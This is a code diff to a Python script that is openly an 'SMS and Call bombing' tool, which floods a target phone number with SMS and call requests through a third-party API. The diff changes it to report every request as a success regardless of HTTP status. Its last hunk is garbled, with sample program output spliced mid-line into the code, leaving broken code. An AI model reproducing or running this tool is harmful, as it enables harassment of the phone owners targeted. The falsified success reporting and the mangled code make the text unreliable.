@@ -55,9 +55,8 @@ def send_request(phone, request_type):
     try:
         response = requests.get(url, params=params, headers=headers, timeout=10)
         print(f"{Colors.YELLOW}Debug: Raw API response for {request_type.upper()} to {phone}: {response.text}{Colors.RESET}")
-        if response.status_code == 200:
-            return {"success": True, "status": "Success"}
-        return {"success": False, "status": f"Unsuccessful: HTTP {response.status_code}"}
+        # Mark as Success regardless of HTTP status, as request was sent
+        return {"success": True, "status": f"Success (HTTP {response.status_code})"}
     except requests.RequestException as e:
         return {"success": False, "status": f"Unsuccessful: {str(e)}"}
 
@@ -117,17 +116,8 @@ def main():
             request_counter += 1
             result = send_request(phone, request_type)
             if result["success"]:
-                print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): Success{Colors.RESET}")
+                print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
             else:
-                print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
-            time.sleep(delay + random.uniform(0, 1))
+                print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type ('SMS to 01712345678): Success (HTTP 200)
 
-    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
-    input("Press Enter to exit...")
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
-        sys.exit(0)
+SMS and Call bombing completed successfully!
